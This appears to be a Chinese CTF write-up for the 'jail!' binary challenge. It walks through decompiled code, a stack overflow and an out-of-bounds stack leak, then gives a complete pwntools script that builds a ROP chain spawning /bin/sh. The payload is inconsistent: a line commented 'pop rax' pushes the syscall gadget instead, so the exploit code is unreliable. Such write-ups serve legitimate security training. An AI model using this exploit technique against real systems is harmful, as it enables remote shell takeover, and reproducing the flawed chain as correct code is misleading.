# squ1rrelCTF
## jail!
> I want to become a dentist! A DENTIST?!
>
> [`prison`](prison)
>
> [`Dockerfile`](Dockerfile)

---

**main function**

呼叫了 `prison()`

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx

  setbuf(stdout, 0LL, envp);
  setbuf(stdin, 0LL, v3);
  puts("Welcome to Maximum Security Prison.");
  puts("You'll be rotting in here for the rest of your life!");
  puts("But first let's get you registered and take you to your cell.");
  prison();
  return 0;
}
```
---

**prison()**

```c
__int64 __fastcall prison(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  __int64 result; // rax
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // esi
  int v15; // edx
  int v16; // ecx
  int v17; // r8d
  int v18; // r9d
  __int64 v19; // [rsp+0h] [rbp-80h]
  int v20; // [rsp+3Ch] [rbp-44h] BYREF
  char v21[64]; // [rsp+40h] [rbp-40h] BYREF

  printf(
    (unsigned int)"They gave you the premium stay so at least you get to choose your cell (1-6): ",
    a2,
    a3,
    a4,
    a5,
    a6,
    "The Professor",
    "Empty Cell",
    "Jay. L. Thyme",
    "Jay. L. Thyme's Wife",
    "Jay. L. Thyme's Wife's Boyfriend",
    "Rob Banks");
  if ( (unsigned int)_isoc99_scanf((unsigned int)"%d", (unsigned int)&v20, v6, v7, v8, v9, v19) == 1 )
  {
    while ( (unsigned int)getchar() != 10 )
      ;
    v14 = v20;
    printf((unsigned int)"Cell #%d: Your cellmate is %s\n", v20, *(&v19 + v20 - 1), v11, v12, v13);
    printf((unsigned int)"Now let's get the registry updated. What is your name: ", v14, v15, v16, v17, v18);
    fgets(v21, 100LL, stdin);
    puts("...");
    sleep(3LL);
    puts("...");
    return puts("What did you expect. You're in here for life this is what it looks like for the rest.");
  }
  else
  {
    puts("Invalid input!");
    do
      result = getchar();
    while ( (_DWORD)result != 10 );
  }
  return result;
}
```
---

**bof**
```c
char v21[64]
fgets(v21, 100LL, stdin);
```
> 他的 buffer 空間只有 64 Byte 但是我們能讀 100 個 Byte

---

**oob**
```c
if ( (unsigned int)_isoc99_scanf((unsigned int)"%d", (unsigned int)&v20, v6, v7, v8, v9, v19) == 1 )

printf((unsigned int)"Cell #%d: Your cellmate is %s\n", v20, *(&v19 + v20 - 1), v11, v12, v13);
```
> 雖然他上面說輸入1~6，但是沒有做範圍限制，我們可以輸入其他的數字
>
> 我們的輸入是 v20 他是整數型別 `%d`
>
> `printf((unsigned int)"Cell #%d: Your cellmate is %s\n", v20, *(&v19 + v20 - 1)` 他會輸出 `v20 - 1` 地方的值，就可以洩漏記憶體上面的東西

---
**查看程式資訊及保護機制**
```shell
❯ file prison
prison: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=11861526f4bb256264011fa2e0118c82e3b99e2c, for GNU/Linux 3.2.0, not stripped
```
> 靜態編譯
```shell
pwndbg> checksec 
File:     /home/younglee/Desktop/squ1rrelCTF/jail!/prison
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
> 他沒有 `PIE`

有 `NX` `Canary` 又是靜態編譯，應該是利用 ROP

--- 

查看組語
```shell
  401b05:	48 8b 15 cc 9b 0c 00 	mov    rdx,QWORD PTR [rip+0xc9bcc]        # 4cb6d8 <stdin>
  401b0c:	48 8d 45 c0          	lea    rax,[rbp-0x40]
  401b10:	be 64 00 00 00       	mov    esi,0x64
  401b15:	48 89 c7             	mov    rdi,rax
  401b18:	e8 63 1a 01 00       	call   413580 <_IO_fgets>
```
實際上是讀 `0x40`，buffer 開 `0x64`，我們能寫 ROP 的空間只有 `0x64-0x48 = 28 Byte` ( 有 `0x8` 是 `rbp` )

顯然他放不下整串 ROP chain

只能找其他地方放我們的 ROP chain，


那剛剛有個 `oob` 可以 leak 出其他記憶體的位置，用 IDA 查看附近有什麼
```shell
-0000000000000080 ; D/A/*   : change type (data/ascii/array)
-0000000000000080 ; N       : rename
-0000000000000080 ; U       : undefine
-0000000000000080 ; Use data definition commands to create local variables and function arguments.
-0000000000000080 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000080 ; Frame size: 80; Saved regs: 8; Purge: 0
-0000000000000080 ;
-0000000000000080
-0000000000000080 var_80          dq ?  # v19 指到的位置
-0000000000000078 var_78          dq ?
-0000000000000070 var_70          dq ?
-0000000000000068 var_68          dq ?
-0000000000000060 var_60          dq ?
-0000000000000058 var_58          dq ?
-0000000000000050                 db ? ; undefined
-000000000000004F                 db ? ; undefined
-000000000000004E                 db ? ; undefined
-000000000000004D                 db ? ; undefined
-000000000000004C                 db ? ; undefined
-000000000000004B                 db ? ; undefined
-000000000000004A                 db ? ; undefined
-0000000000000049                 db ? ; undefined
-0000000000000048                 db ? ; undefined
-0000000000000047                 db ? ; undefined
-0000000000000046                 db ? ; undefined
-0000000000000045                 db ? ; undefined
-0000000000000044 var_44          dd ?
-0000000000000040 var_40          db 64 dup(?) # v21 的位置，他是我們 bof 的 buffer 
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```
可以算出相對位置，然後 leak 出 `v21` 的實際位置

有了 v21 的位置，他是我們 input 的位置，那就可以在輸入的時候直接寫 ROP 這樣我們就有了足夠的空間

接著找 Gadget
```
0x0000000000401a0d : pop rdi ; ret
0x0000000000401a1a : pop rdx ; ret
0x0000000000413676 : pop rsi ; pop rbp ; ret
0x000000000041f464 : pop rax ; ret
0x00000000004013b8 : syscall
```
------
**ROP**

```python

pop_rdi = 0x401a0d
pop_rsi_pbp = 0x413676
pop_rax = 0x41f464
syscall = 0x4013b8
pop_rsp = 0x4450f8


payload  = b"/bin/sh\x00"           # 8 byte
payload += p64(pop_rdi)            # pop rdi 8 byte
payload += p64(buffer_stack_addr)   # 8 byte
payload += p64(pop_rsi_pbp)            # pop rsi, pop rbp  8 byte
payload += p64(0)                   # 8 byte
payload += p64(0)                   # 8 byte
payload += p64(syscall)            # pop rax 8 byte
payload += p64(59)                  # execve 8 byte
payload += p64(syscall)            # syscall   8 byte
# --
payload += p64(pop_rsp)            # pop rsp  8 byte  <- initial ret
payload += p64(buffer_stack_addr+8) # 
```

完整 solve.py
```python
from pwn import *

#p = remote("20.84.72.194", 5001)
p = process("./prison")

# first leak address of name buffer
p.sendlineafter(b"cell (1-6):", b"9") #17
p.recvuntil(b"Your cellmate is ")
buffer_stack_addr = int.from_bytes(p.recvline()[:6], "little") - 80

# send the rop chain

pop_rdi = 0x401a0d
pop_rsi_pbp = 0x413676
pop_rax = 0x41f464
syscall = 0x4013b8
pop_rsp = 0x4450f8


payload  = b"/bin/sh\x00"           #         8 byte
payload += p64(pop_rdi)             # pop rdi 8 byte
payload += p64(buffer_stack_addr)   #         8 byte
payload += p64(pop_rsi_pbp)         # pop rsi, pop rbp  8 byte
payload += p64(0)                   #         8 byte
payload += p64(0)                   #         8 byte
payload += p64(syscall)             # pop rax 8 byte
payload += p64(59)                  # execve  8 byte
payload += p64(syscall)             # syscall 8 byte
# --
payload += p64(pop_rsp)             # pop rsp 8 byte  <- initial ret
payload += p64(buffer_stack_addr + 8) #                 8 byte

p.sendlineafter(b"name:", payload)

p.interactive()
```


